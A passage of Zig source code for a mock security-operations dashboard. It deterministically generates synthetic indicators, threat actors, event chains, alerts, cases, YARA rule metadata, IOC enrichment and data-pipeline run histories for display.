                    while (j < 64) : (j += 1) {
                        h.buf[j] = "0123456789abcdef"[r.intRangeAtMost(usize, 0, 15)];
                    }
                    h.len = 64;
                    break :blk h;
                },
                .url => domain.FixedStr(128).fromFmt("https://{s}/{s}{d}", .{ evil_domains[r.intRangeAtMost(usize, 0, evil_domains.len - 1)], url_paths[r.intRangeAtMost(usize, 0, url_paths.len - 1)], r.intRangeAtMost(u16, 100, 9999) }),
                .email => domain.FixedStr(128).fromFmt("{s}{d}@{s}", .{ email_locals[r.intRangeAtMost(usize, 0, email_locals.len - 1)], r.intRangeAtMost(u16, 1, 99), evil_domains[r.intRangeAtMost(usize, 0, evil_domains.len - 1)] }),
            };
            const first = self.base_ms - @as(i64, r.intRangeAtMost(u32, 0, 60)) * std.time.ms_per_day;
            try store.iocs.append(alloc, .{
                .id = @intCast(ioc_i + 1),
                .type = t,
                .value = value,
                .confidence = r.intRangeAtMost(u8, 20, 98),
                .feed = @intCast(r.intRangeAtMost(usize, 0, feed_names.len - 1)),
                .first_seen_ms = first,
                .last_seen_ms = first + @as(i64, r.intRangeAtMost(u32, 0, 50)) * std.time.ms_per_hour,
                .hits = if (r.intRangeAtMost(u8, 0, 9) == 0) r.intRangeAtMost(u32, 1, 12) else 0,
            });
        }
        // Threat actors.
        for (actor_defs, 0..) |ad, i| {
            var actor: domain.ThreatActor = .{
                .id = @intCast(i),
                .name = domain.FixedStr(48).from(ad.name),
                .aliases = domain.FixedStr(96).from(ad.aliases),
                .motivation = ad.motivation,
                .notes = domain.FixedStr(600).from(ad.notes),
            };
            // Tag each actor with the techniques of one chain + extras.
            const chain = chains[i % chains.len];
            for (chain) |st| {
                if (actor.technique_count >= domain.ACTOR_TECHNIQUE_CAP) break;
                actor.techniques[actor.technique_count] = tidOf(st.tid);
                actor.technique_count += 1;
            }
            try store.actors.append(alloc, actor);
        }

        // ── Events: 26 h background noise + scripted chains ──────────────
        try self.buildBackgroundEvents(store);
        try self.buildChains(store);
        // Sort by timestamp so panels can binary-search ranges; then re-id
        // in ts order so eventById's binary search stays valid.
        std.mem.sort(domain.Event, store.events.items, {}, struct {
            fn less(_: void, a: domain.Event, b: domain.Event) bool {
                if (a.ts_ms != b.ts_ms) return a.ts_ms < b.ts_ms;
                return a.id < b.id;
            }
        }.less);
        // Remap ids to sorted order, preserving parent links.
        {
            var id_map = std.AutoHashMap(u64, u64).init(alloc);
            defer id_map.deinit();
            for (store.events.items, 0..) |*e, i| {
                try id_map.put(e.id, @intCast(i + 1));
            }
            for (store.events.items, 0..) |*e, i| {
                e.id = @intCast(i + 1);
                if (e.parent) |p| e.parent = id_map.get(p);
            }
            self.next_event_id = store.events.items.len + 1;
        }

        // Chain beacon destinations become high-confidence ip IOCs so the
        // NET panel's IOC-match column has real hits.
        for (store.events.items) |*e| {
            if (e.technique == null or e.dst_ip.len == 0) continue;
            if (e.kind != .network and e.kind != .dns) continue;
            var known = false;
            for (store.iocs.items) |*ic| {
                if (ic.type == .ip and std.mem.eql(u8, ic.value.slice(), e.dst_ip.slice())) {
                    ic.hits += 1;
                    ic.last_seen_ms = @max(ic.last_seen_ms, e.ts_ms);
                    known = true;
                    break;
                }
            }
            if (!known) {
                try store.iocs.append(alloc, .{
                    .id = @intCast(store.iocs.items.len + 1),
                    .type = .ip,
                    .value = domain.FixedStr(128).from(e.dst_ip.slice()),
                    .confidence = 92,
                    .feed = 3, // Internal Blocklist
                    .first_seen_ms = e.ts_ms,
                    .last_seen_ms = e.ts_ms,
                    .hits = 1,
                });
            }
        }

        // Feed ioc_count = actual attribution counts.
        for (store.feeds.items) |*f| {
            var n: u32 = 0;
            for (store.iocs.items) |*ic| {
                if (ic.feed == f.id) n += 1;
            }
            f.ioc_count = n;
        }

        // ── Alerts: fire rules against technique-tagged events ───────────
        try self.buildAlerts(store);

        // ── Cases: one per chain + misc clusters ─────────────────────────
        try self.buildCases(store);

        // ── YARA rules + IOC enrichment + url scans ──────────────────────
        // Appended after everything else so the RNG draw sequence of the
        // pre-existing world is untouched (same seed ⇒ same events/alerts).
        try self.buildYara(store);
        try self.buildEnrichment(store);
        try self.buildUrlScans(store);

        // Data pipelines (also appended last — RNG stream untouched above).
        try self.buildPipelines(store);

        store.touch();
    }

    /// Diurnal weight for an hour-of-day (0..23): office-hours hump.
    fn diurnal(hour: f32) f32 {
        const d = (hour - 14.0);
        return 0.30 + 0.70 * @exp(-(d * d) / 16.0);
    }

    fn buildBackgroundEvents(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        const start = self.base_ms - WORLD_SPAN_MS;
        // ~2600 background events across 26 h, diurnally weighted.
        const slots: usize = 26 * 6; // 10-minute buckets
        const per_bucket_base: f32 = 2600.0 / @as(f32, @floatFromInt(slots));
        var b: usize = 0;
        while (b < slots) : (b += 1) {
            const bucket_start = start + @as(i64, @intCast(b)) * 10 * std.time.ms_per_min;
            const hour_of_day = @as(f32, @floatFromInt(@mod(@divFloor(bucket_start, std.time.ms_per_hour), 24)));
            // The diurnal curve averages ~0.51 over a day — the 2.0 factor
            // rescales so the 26 h total lands near the 2600 target.
            const want = per_bucket_base * diurnal(hour_of_day) * 2.0;
            var n: usize = @intFromFloat(want);
            const r0 = self.rand();
            if (r0.float(f32) < (want - @as(f32, @floatFromInt(n)))) n += 1;
            var i: usize = 0;
            while (i < n) : (i += 1) {
                const ts = bucket_start + @as(i64, self.rand().intRangeAtMost(u32, 0, 10 * std.time.ms_per_min - 1));
                try store.events.append(alloc, self.benignEvent(store, ts));
            }
        }
    }

    fn benignEvent(self: *Generator, store: *Store, ts: i64) domain.Event {
        const r = self.rand();
        const kind: domain.EventKind = @enumFromInt(r.weightedIndex(u16, &.{ 34, 22, 14, 12, 10, 4, 4 }));
        const host: u16 = @intCast(r.intRangeAtMost(usize, 0, store.hosts.items.len - 1));
        const user: u16 = @intCast(r.intRangeAtMost(usize, 0, store.users.items.len - 1));
        var e: domain.Event = .{
            .id = self.next_event_id,
            .ts_ms = ts,
            .kind = kind,
            .host = host,
            .user = user,
            .sensor = switch (kind) {
                .process, .file, .registry, .script => @as(u16, if (host >= 16) 1 else 0),
                .network => 2,
                .auth => 0,
                .dns => 5,
            },
        };
        self.next_event_id += 1;
        switch (kind) {
            .process, .script => {
                const p = benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)];
                e.process = domain.FixedStr(64).from(p);
                e.cmdline = domain.FixedStr(160).fromFmt("{s} --type=renderer --lang=en-US", .{p});
            },
            .network => {
                e.process = domain.FixedStr(64).from(benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)]);
                e.dst_ip = domain.FixedStr(46).fromFmt("172.16.{d}.{d}", .{ r.intRangeAtMost(u8, 0, 31), r.intRangeAtMost(u8, 1, 254) });
                const common_ports = [_]u16{ 443, 443, 443, 80, 8080, 445, 53 };
                e.dst_port = common_ports[r.intRangeAtMost(usize, 0, common_ports.len - 1)];
                e.cmdline = domain.FixedStr(160).fromFmt("tls session {d}s {d}KB", .{ r.intRangeAtMost(u16, 1, 900), r.intRangeAtMost(u16, 1, 4096) });
            },
            .auth => {
                e.process = domain.FixedStr(64).from("lsass.exe");
                const t4: u8 = r.intRangeAtMost(u8, 2, 3);
                e.cmdline = domain.FixedStr(160).fromFmt("logon type {d} success", .{t4});
            },
            .file => {
                e.process = domain.FixedStr(64).from(benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)]);
                e.cmdline = domain.FixedStr(160).fromFmt("write C:\\Users\\{s}\\Documents\\doc{d}.xlsx", .{ store.userName(user), r.intRangeAtMost(u16, 1, 400) });
            },
            .dns => {
                e.process = domain.FixedStr(64).from("svchost.exe");
                e.cmdline = domain.FixedStr(160).fromFmt("query A {s}", .{dns_domains[r.intRangeAtMost(usize, 0, dns_domains.len - 1)]});
                e.dst_port = 53;
            },
            .registry => {
                e.process = domain.FixedStr(64).from("svchost.exe");
                e.cmdline = domain.FixedStr(160).from("set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");
            },
        }
        return e;
    }

    fn buildChains(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        for (chains, 0..) |chain, ci| {
            const r = self.rand();
            // Chain start: 3–20 h ago so every chain is inside the window.
            const start = self.base_ms - @as(i64, r.intRangeAtMost(u32, 3 * 60, 20 * 60)) * std.time.ms_per_min;
            const host: u16 = if (ci == 1) 19 else @intCast(r.intRangeAtMost(usize, 0, 15)); // web shell on SRV-WEB-01
            const user: u16 = @intCast(r.intRangeAtMost(usize, 0, 9));
            var ts = start;
            var parent: ?u64 = null;
            const evil = evil_domains[ci % evil_domains.len];
            for (chain) |st| {
                ts += @as(i64, st.gap_min) * std.time.ms_per_min + @as(i64, r.intRangeAtMost(u32, 0, 40_000));
                var e: domain.Event = .{
                    .id = self.next_event_id,
                    .ts_ms = ts,
                    .kind = st.kind,
                    .severity = st.sev,
                    .host = host,
                    .user = user,
                    .sensor = switch (st.kind) {
                        .network, .dns => 2,
                        else => @as(u16, if (host >= 16) 1 else 0),
                    },
                    .parent = parent,
                    .technique = tidOf(st.tid),
                    .process = domain.FixedStr(64).from(st.proc),
                };
                self.next_event_id += 1;
                // %u / %evil% substitution in canned cmdlines.
                if (std.mem.indexOf(u8, st.cmdline, "%u")) |_| {
                    var tmp: [200]u8 = undefined;
                    const n = std.mem.replace(u8, st.cmdline, "%u", store.userName(user), &tmp);
                    _ = n;
                    const out_len = st.cmdline.len - 2 + store.userName(user).len;
                    e.cmdline = domain.FixedStr(160).from(tmp[0..@min(out_len, 160)]);
                } else if (std.mem.indexOf(u8, st.cmdline, "%evil%")) |_| {
                    var tmp: [220]u8 = undefined;
                    _ = std.mem.replace(u8, st.cmdline, "%evil%", evil, &tmp);
                    const out_len = st.cmdline.len - 6 + evil.len;
                    e.cmdline = domain.FixedStr(160).from(tmp[0..@min(out_len, 160)]);
                } else {
                    e.cmdline = domain.FixedStr(160).from(st.cmdline);
                }
                if (st.evil_net) {
                    e.dst_ip = domain.FixedStr(46).fromFmt("{d}.{d}.{d}.{d}", .{ r.intRangeAtMost(u8, 45, 195), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 1, 254) });
                    const beacon_ports = [_]u16{ 443, 8443, 443 };
                    e.dst_port = if (st.kind == .dns) 53 else beacon_ports[r.intRangeAtMost(usize, 0, beacon_ports.len - 1)];
                }
                try store.events.append(alloc, e);
                parent = e.id;
            }
        }
    }

    fn buildAlerts(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        // 1) True positives: every technique-tagged event ≥ medium fires its
        //    matching (enabled/testing) rule.
        for (store.events.items) |*e| {
            const tid = e.technique orelse continue;
            if (@intFromEnum(e.severity) < @intFromEnum(domain.Severity.medium)) continue;
            var rule_idx: ?u16 = null;
            for (store.rules.items) |*rl| {
                if (rl.technique == tid and rl.status != .disabled) {
                    rule_idx = rl.id;
                    break;
                }
            }
            const rid = rule_idx orelse continue;
            const rl = &store.rules.items[rid];
            var a: domain.Alert = .{
                .id = self.next_alert_id,
                .ts_ms = e.ts_ms + 1500,
                .rule = rid,
                .severity = rl.severity,
                .technique = tid,
                .title = domain.FixedStr(96).from(rl.name.slice()),
                .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(e.host), store.userName(e.user) }),
            };
            self.next_alert_id += 1;
            a.event_ids[0] = e.id;
            a.event_count = 1;
            try store.alerts.append(alloc, a);
        }

        // 2) FP noise from the noisy rules against benign events, spread
        //    over the window — the tuning panel's raw material.
        const fp_total: usize = 85;
        var i: usize = 0;
        while (i < fp_total) : (i += 1) {
            const r = self.rand();
            // Pick a noisy rule.
            var noisy_ids: [16]u16 = undefined;
            var noisy_n: usize = 0;
            for (rule_defs, 0..) |rd, ri| {
                if (rd.noisy and noisy_n < noisy_ids.len) {
                    noisy_ids[noisy_n] = @intCast(ri);
                    noisy_n += 1;
                }
            }
            const rid = noisy_ids[r.intRangeAtMost(usize, 0, noisy_n - 1)];
            const rl = &store.rules.items[rid];
            if (rl.status == .disabled) continue;
            const ev = &store.events.items[r.intRangeAtMost(usize, 0, store.events.items.len - 1)];
            var a: domain.Alert = .{
                .id = self.next_alert_id,
                .ts_ms = ev.ts_ms + 900,
                .rule = rid,
                .severity = rl.severity,
                .technique = rl.technique,
                .title = domain.FixedStr(96).from(rl.name.slice()),
                .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(ev.host), store.userName(ev.user) }),
            };
            self.next_alert_id += 1;
            a.event_ids[0] = ev.id;
            a.event_count = 1;
            // Most FP noise is already triaged — realistic queue shape.
            const roll = r.intRangeAtMost(u8, 0, 9);
            a.status = if (roll < 5) .false_positive else if (roll < 7) .resolved else .new;
            if (a.status != .new) {
                a.assignee = domain.FixedStr(24).from(analyst_pool[r.intRangeAtMost(usize, 0, 2)]);
                // SLA stamps: id-derived (no RNG draws) so MTTA/MTTR have
                // a believable spread — ack in 3–27 min, close in +15–194.
                a.acked_ms = a.ts_ms + @as(i64, @intCast(a.id % 25 + 3)) * std.time.ms_per_min;
                a.resolved_ms = a.acked_ms + @as(i64, @intCast(a.id % 180 + 15)) * std.time.ms_per_min;
            }
            try store.alerts.append(alloc, a);
        }

        // Sort alerts newest-last (panels sort their own views).
        std.mem.sort(domain.Alert, store.alerts.items, {}, struct {
            fn less(_: void, a: domain.Alert, b: domain.Alert) bool {
                return a.ts_ms < b.ts_ms;
            }
        }.less);
    }

    fn buildCases(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        const r = self.rand();
        // One case per chain: gather that chain's alerts via technique set +
        // shared host entity of the chain's first event.
        for (chains, 0..) |chain, ci| {
            var c: domain.Case = .{
                .id = @intCast(ci + 1),
                .title = domain.FixedStr(96).from(chain_case_titles[ci]),
                .severity = .critical,
                .status = switch (ci) {
                    0 => .active,
                    1 => .contained,
                    2 => .open,
                    else => .active,
                },
                .assignee = domain.FixedStr(24).from(analyst_pool[ci % 3]),
                .notes = domain.FixedStr(480).fromFmt("Scoping in progress. {d}-stage chain; oldest indicator inside the 26h window. Next: host isolation decision + credential reset sweep.", .{chain.len}),
            };
            // Link alerts whose technique matches any chain stage (first hit
            // per stage keeps the case tight).
            for (chain) |st| {
                const tid = tidOf(st.tid);
                for (store.alerts.items) |*a| {
                    if (a.case_id != null or a.technique == null) continue;
                    if (a.technique.? != tid) continue;
                    if (c.alert_count >= domain.CASE_ALERT_CAP) break;
                    a.case_id = c.id;
                    if (a.status == .new) {
                        a.status = .investigating;
                        a.acked_ms = a.ts_ms + @as(i64, @intCast(a.id % 20 + 2)) * std.time.ms_per_min;
                    }
                    if (a.assignee.len == 0) a.assignee = c.assignee;
                    c.alert_ids[c.alert_count] = a.id;
                    c.alert_count += 1;
                    break;
                }
            }
            // Case timestamps track its alerts.
            var opened: i64 = self.base_ms;
            var updated: i64 = 0;
            for (c.alert_ids[0..c.alert_count]) |aid| {
                if (store.alertById(aid)) |a| {
                    opened = @min(opened, a.ts_ms);
                    updated = @max(updated, a.ts_ms);
                }
            }
            c.opened_ms = opened;
            c.updated_ms = if (updated > 0) updated else opened;
            try store.cases.append(alloc, c);
        }
        // Misc cases (tuning follow-ups, closed history).
        const misc = [_]struct { title: []const u8, sev: domain.Severity, status: domain.CaseStatus }{
            .{ .title = "Noisy rule review: browser cred-store FPs", .sev = .low, .status = .open },
            .{ .title = "Degraded sensor: aws-cloudtrail ingest lag", .sev = .medium, .status = .active },
            .{ .title = "Password-spray source blocked at perimeter", .sev = .medium, .status = .closed },
            .{ .title = "Phish wave 06-28 — mailbox purge complete", .sev = .low, .status = .closed },
        };
        for (misc, 0..) |m, i| {
            const opened = self.base_ms - @as(i64, r.intRangeAtMost(u32, 4, 120)) * std.time.ms_per_hour;
            try store.cases.append(alloc, .{
                .id = @intCast(chains.len + i + 1),
                .title = domain.FixedStr(96).from(m.title),
                .severity = m.sev,
                .status = m.status,
                .assignee = domain.FixedStr(24).from(analyst_pool[(i + 1) % 3]),
                .opened_ms = opened,
                .updated_ms = opened + @as(i64, r.intRangeAtMost(u32, 1, 40)) * std.time.ms_per_hour,
                .notes = domain.FixedStr(480).from("See linked alerts + LOG excerpts."),
            });
        }
    }

    fn buildYara(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        for (yara_defs, 0..) |yd, i| {
            const r = self.rand();
            try store.yara.append(alloc, .{
                .id = @intCast(i),
                .code = domain.FixedStr(8).fromFmt("Y-{d:0>4}", .{i + 1}),
                .name = domain.FixedStr(64).from(yd.name),
                .status = yd.status,
                .severity = yd.sev,
                .technique = tidOf(yd.tid),
                .author = domain.FixedStr(24).from(analyst_pool[i % 3]),
                .date_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 3, 54)) * std.time.ms_per_day,
                .description = domain.FixedStr(160).from(yd.description),
                // The meta-fail story is a missing `reference` field.
                .reference = if (yd.meta_fail) .{} else domain.FixedStr(96).from(yd.reference),
                .version = 1 + @as(u16, @intCast(i % 3)),
                .strings_excerpt = domain.FixedStr(240).from(yd.strings_excerpt),
                .condition = domain.FixedStr(160).from(yd.condition),
                .gates = .{
                    .compile = .pass,
                    .meta = if (yd.meta_fail) .fail else .pass,
                    .tp = if (yd.tp_fail) .fail else .pass,
                    .fp_count = yd.fp_count,
                    .scan_ms = yd.scan_ms + r.float(f32) * 2.0,
                    .last_ci_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 10, 300)) * std.time.ms_per_min,
                },
            });
        }
    }

    const registrar_pool = [_][]const u8{
        "NameCheap Inc.", "GoDaddy.com LLC", "Tucows Domains", "PDR Ltd.",
        "Hosting Concepts BV", "NiceNIC Intl",
    };
    const as_pool = [_]struct { asn: u32, owner: []const u8, cc: []const u8 }{
        .{ .asn = 13335, .owner = "CLOUDFLARENET", .cc = "US" },
        .{ .asn = 16509, .owner = "AMAZON-02", .cc = "US" },
        .{ .asn = 9009, .owner = "M247 Europe", .cc = "RO" },
        .{ .asn = 20473, .owner = "AS-VULTR", .cc = "US" },
        .{ .asn = 44477, .owner = "STARK-INDUSTRIES", .cc = "MD" },
        .{ .asn = 197695, .owner = "AS-REG", .cc = "RU" },
    };
    const threat_label_pool = [_][]const u8{
        "trojan.agent/generic", "phishing.credharvest", "downloader.ps1/cradle",
        "ransomware.locknote", "backdoor.webshell", "infostealer.chromium",
    };
    const brand_pool = [_][]const u8{ "Microsoft", "Okta", "DHL", "DocuSign", "" };
    const tls_issuer_pool = [_][]const u8{
        "R11 (Let's Encrypt)", "GTS CA 1P5", "Sectigo RSA DV", "self-signed",
    };

    /// Enrichment as a *pure function* of the IOC value: FNV-1a(value) seeds
    /// a LOCAL prng, so build-time and runtime-job enrichment of the same
    /// IOC are byte-identical and never consume the generator's main stream.
    /// Date fields anchor to the IOC's own timestamps (not `now_ms`) so the
    /// record is reproducible; only `fetched_ms` carries the call time.
    pub fn enrichmentFor(store: *const Store, ioc: *const domain.Ioc, now_ms: i64) domain.IocEnrichment {
        const hash = std.hash.Fnv1a_64.hash(ioc.value.slice());
        var local = std.Random.DefaultPrng.init(hash);
        const r = local.random();

        var e: domain.IocEnrichment = .{
            .ioc_id = ioc.id,
            .status = .done,
            .source = .mock,
            .fetched_ms = now_ms,
            .first_seen_ms = ioc.first_seen_ms,
            .last_seen_ms = ioc.last_seen_ms,
        };

        // Verdict correlates with feed confidence.
        const roll = r.intRangeAtMost(u8, 0, 99);
        e.verdict = if (ioc.confidence >= 80)
            (if (roll < 75) domain.Verdict.malicious else if (roll < 95) .suspicious else .clean)
        else if (ioc.confidence >= 50)
            (if (roll < 25) domain.Verdict.malicious else if (roll < 70) .suspicious else .clean)
        else
            (if (roll < 8) domain.Verdict.malicious else if (roll < 30) .suspicious else .clean);

        const engines: u16 = r.intRangeAtMost(u16, 65, 95);
        switch (e.verdict) {
            .malicious => {
                e.det_malicious = r.intRangeAtMost(u16, engines * 45 / 100, engines * 80 / 100);
                e.det_suspicious = r.intRangeAtMost(u16, 0, 4);
                e.reputation = -@as(i32, r.intRangeAtMost(u16, 20, 90));
                e.threat_label = domain.FixedStr(48).from(threat_label_pool[@intCast(hash % threat_label_pool.len)]);
            },
            .suspicious => {
                e.det_malicious = r.intRangeAtMost(u16, 0, 2);
                e.det_suspicious = r.intRangeAtMost(u16, 3, 12);
                e.reputation = -@as(i32, r.intRangeAtMost(u16, 5, 30));
            },
            else => {
                e.reputation = r.intRangeAtMost(u8, 0, 40);
            },
        }
        e.det_undetected = r.intRangeAtMost(u16, 2, 10);
        e.det_harmless = engines - @min(engines, e.det_malicious + e.det_suspicious + e.det_undetected);

        switch (ioc.type) {
            .domain => {
                e.registrar = domain.FixedStr(48).from(registrar_pool[@intCast(hash % registrar_pool.len)]);
                // NRD story: malicious domains skew young.
                const age_days: u32 = if (e.verdict == .malicious)
                    r.intRangeAtMost(u32, 3, 60)
                else
                    r.intRangeAtMost(u32, 30, 900);
                e.creation_ms = ioc.first_seen_ms - @as(i64, age_days) * std.time.ms_per_day;
                e.categories = domain.FixedStr(96).from(switch (e.verdict) {
                    .malicious => "malware hosting, newly registered",
                    .suspicious => "uncategorized, parked",
                    else => "content delivery",
                });
            },
            .ip => {
                const as_e = as_pool[@intCast(hash % as_pool.len)];
                e.asn = as_e.asn;
                e.as_owner = domain.FixedStr(48).from(as_e.owner);
                e.country = domain.FixedStr(4).from(as_e.cc);
                // /24 network derived from the value's first three octets.
                const v = ioc.value.slice();
                const cut = std.mem.lastIndexOfScalar(u8, v, '.') orelse v.len;
                e.network = domain.FixedStr(24).fromFmt("{s}.0/24", .{v[0..cut]});
            },
            .url => {
                e.scan_score = switch (e.verdict) {
                    .malicious => r.intRangeAtMost(u8, 70, 100),
                    .suspicious => r.intRangeAtMost(u8, 40, 69),
                    else => r.intRangeAtMost(u8, 0, 30),
                };
                e.brands = domain.FixedStr(48).from(brand_pool[@intCast(hash % brand_pool.len)]);
                // Host part of the URL (strip scheme, cut at first '/').
                const v = ioc.value.slice();
                const host_start = if (std.mem.indexOf(u8, v, "://")) |p| p + 3 else 0;
                const host_end = std.mem.indexOfScalarPos(u8, v, host_start, '/') orelse v.len;
                e.page_domain = domain.FixedStr(64).from(v[host_start..host_end]);
                e.page_ip = domain.FixedStr(46).fromFmt("{d}.{d}.{d}.{d}", .{
                    r.intRangeAtMost(u8, 45, 195), r.intRangeAtMost(u8, 0, 255),
                    r.intRangeAtMost(u8, 0, 255),  r.intRangeAtMost(u8, 1, 254),
                });
                e.tls_issuer = domain.FixedStr(48).from(tls_issuer_pool[@intCast(hash % tls_issuer_pool.len)]);
            },
            .hash_sha256, .email => {},
        }

        // Pivots: index arithmetic over the IOC list (no RNG-order
        // dependence), filtered to ip/domain, skipping self and duplicates.
        if (store.iocs.items.len > 1 and (ioc.type == .url or ioc.type == .domain or ioc.type == .ip)) {
            const want: u8 = if (e.verdict == .malicious) 6 else 3;
            var k: u64 = 0;
            while (k < 24 and e.pivot_count < want) : (k += 1) {
                const idx: usize = @intCast((hash +% k *% 7919) % store.iocs.items.len);
                const cand = &store.iocs.items[idx];
                if (cand.id == ioc.id) continue;
                if (cand.type != .ip and cand.type != .domain) continue;
                var dup = false;
                for (e.pivot_ids[0..e.pivot_count]) |pid| {
                    if (pid == cand.id) dup = true;
                }
                if (dup) continue;
                e.pivot_ids[e.pivot_count] = cand.id;
                e.pivot_count += 1;
            }
        }
        return e;
    }

    fn buildEnrichment(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        // Enrich the interesting subset: every IOC that actually hit
        // telemetry, plus every 7th by index for breadth (~120 records).
        for (store.iocs.items, 0..) |*ic, i| {
            if (ic.hits == 0 and i % 7 != 0) continue;
            try store.enrichments.append(alloc, enrichmentFor(store, ic, self.base_ms));
        }
    }

    fn buildUrlScans(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;
        // Completed submissions for the first 3 enriched url IOCs, plus one
        // pending — the submit → pending → done lifecycle on screen.
        var made: u32 = 0;
        for (store.iocs.items) |*ic| {
            if (ic.type != .url) continue;
            var enriched = false;
            for (store.enrichments.items) |*e| {
                if (e.ioc_id == ic.id) {
                    enriched = true;
                    break;
                }
            }
            if (!enriched) continue;
            const done = made < 3;
            const submitted = self.base_ms - @as(i64, made + 1) * std.time.ms_per_hour;
            try store.urlscans.append(alloc, .{
                .id = made + 1,
                .ioc_id = ic.id,
                .state = if (done) .done else .pending,
                .submitted_ms = submitted,
                .completed_ms = if (done) submitted + 25 * std.time.ms_per_s else 0,
            });
            made += 1;
            if (made >= 4) break;
        }
    }

    fn buildPipelines(self: *Generator, store: *Store) !void {
        const alloc = store.allocator;

        for (source_defs, 0..) |sd, i| {
            const r = self.rand();
            try store.sources.append(alloc, .{
                .id = @intCast(i + 1),
                .name = domain.FixedStr(48).from(sd.name),
                .kind = sd.kind,
                .dsn = domain.FixedStr(96).from(sd.dsn),
                .state = sd.state,
                .last_test_ms = if (sd.state == .err)
                    self.base_ms - 27 * std.time.ms_per_hour
                else
                    self.base_ms - @as(i64, r.intRangeAtMost(u32, 1, 55)) * std.time.ms_per_min,
                .latency_ms = sd.latency_ms,
                .tables = sd.tables,
            });
        }

        var next_run_id: u32 = 1;
        for (pipeline_defs, 0..) |pd, i| {
            var p: domain.Pipeline = .{
                .id = @intCast(i + 1),
                .code = domain.FixedStr(8).fromFmt("P-{d:0>4}", .{i + 1}),
                .name = domain.FixedStr(64).from(pd.name),
                .source = pd.source + 1, // defs index → DataSource.id
                .sink = pd.sink,
                .target = domain.FixedStr(64).from(pd.target),
                .schedule_min = pd.schedule_min,
                .status = pd.status,
                .owner = domain.FixedStr(24).from(pd.owner),
            };
            for (pd.steps) |st| {
                p.steps[p.step_count] = .{
                    .kind = st.kind,
                    .model = domain.FixedStr(48).from(st.model),
                    .materialization = st.mat,
                };
                p.step_count += 1;
            }
            for (pd.tests) |ts| {
                p.tests[p.test_count] = .{
                    .kind = ts.kind,
                    .target = domain.FixedStr(48).from(ts.target),
                    .status = if (ts.fail > 0) .fail else .pass,
                    .failures = ts.fail,
                };
                p.test_count += 1;
            }

            // Run history: `runs` completions spaced one schedule apart,
            // newest just inside the window.
            const tc = p.testCounts();
            const gap_ms: i64 = @max(@as(i64, pd.schedule_min), 5) * std.time.ms_per_min;
            var k: u8 = 0;
            while (k < pd.runs) : (k += 1) {
                const r = self.rand();
                const age: i64 = @as(i64, pd.runs - k) * gap_ms;
                const started = self.base_ms - age - @as(i64, r.intRangeAtMost(u32, 0, 60_000));
                const newest = k == pd.runs - 1;
                var run: domain.PipelineRun = .{
                    .id = next_run_id,
                    .pipeline = p.id,
                    .started_ms = started,
                    .duration_ms = @as(i64, r.intRangeAtMost(u32, 2_000, 40_000)),
                    .status = .success,
                    .tests_passed = tc.pass,
                    .tests_failed = tc.fail,
                };
                next_run_id += 1;
                if (pd.runs_fail) {
                    run.status = .failed;
                    run.err = domain.FixedStr(64).fromFmt("connect timeout: {s}", .{source_defs[pd.source].dsn});
                } else {
                    const jitter = r.intRangeAtMost(u64, 0, pd.base_rows / 5);
                    run.rows_in = pd.base_rows + jitter;
                    run.rows_out = run.rows_in;
                    run.watermark_ms = started;
                    p.watermark_ms = @max(p.watermark_ms, started);
                    if (newest and pd.partial_last) {
                        run.status = .partial;
                        run.rows_rejected = p.testFailures();
                        run.rows_out = run.rows_in - run.rows_rejected;
                        // Rejected-row samples land in the dead-letter queue.
                        for (p.tests[0..p.test_count]) |*ts| {
                            if (ts.status != .fail or ts.kind == .freshness) continue;
                            var dk: u32 = 0;
                            while (dk < @min(ts.failures, 4)) : (dk += 1) {
                                try store.dead_letters.append(alloc, .{
                                    .id = @intCast(store.dead_letters.items.len + 1),
                                    .pipeline = p.id,
                                    .run_id = run.id,
                                    .ts_ms = started,
                                    .kind = ts.kind,
                                    .target = ts.target,
                                    .sample = domain.FixedStr(96).fromFmt("attr #{d}: type=ipv6 not in accepted set", .{48200 + dk}),
                                });
                            }
                        }
                    }
                }
                p.last_run_ms = @max(p.last_run_ms, started);
                try store.pipeline_runs.append(alloc, run);
            }
            try store.pipelines.append(alloc, p);
        }
    }

    /// Finalize a runtime "Run now" execution as a *pure function* of the
    /// pipeline (FNV of its name seeds a local PRNG — same trick as
    /// enrichmentFor, so a manual run never perturbs world determinism).
    /// Failing tests make the run PARTIAL; an unreachable source fails it.
    pub fn pipelineRunResult(store: *Store, run: domain.PipelineRun, now_ms: i64) domain.PipelineRun {
        var out = run;
        out.duration_ms = @max(1000, now_ms - run.started_ms);
        const p = store.pipelineById(run.pipeline) orelse {
            out.status = .failed;
            out.err = domain.FixedStr(64).from("pipeline vanished");
            return out;
        };
        if (store.sourceById(p.source)) |src| {
            if (src.state == .err) {
                out.status = .failed;
                out.err = domain.FixedStr(64).fromFmt("connect timeout: {s}", .{src.dsn.slice()});
                return out;
            }
        }
        const hash = std.hash.Fnv1a_64.hash(p.name.slice());
        var local = std.Random.DefaultPrng.init(hash);
        const r = local.random();
        const base: u64 = 500 + hash % 100_000;
        out.rows_in = base + r.intRangeAtMost(u64, 0, base / 5);
        out.rows_rejected = p.testFailures();
        out.rows_out = out.rows_in -| out.rows_rejected;
        const tc = p.testCounts();
        out.tests_passed = tc.pass;
        out.tests_failed = tc.fail;
        out.status = if (tc.fail > 0) .partial else .success;
        // Data ingested through "now" — the caller's watermark bump.
        // (Time-dependent like enrichmentFor's fetched_ms; the row shape
        // itself stays a pure function of the pipeline.)
        out.watermark_ms = now_ms;
        return out;
    }

    /// Live trickle: expected ~0.35 events/s (diurnal-weighted), the odd
    /// alert, sensor eps jitter. Call once per frame with wall-clock ms.
    pub fn tick(self: *Generator, store: *Store, now_ms: i64) void {
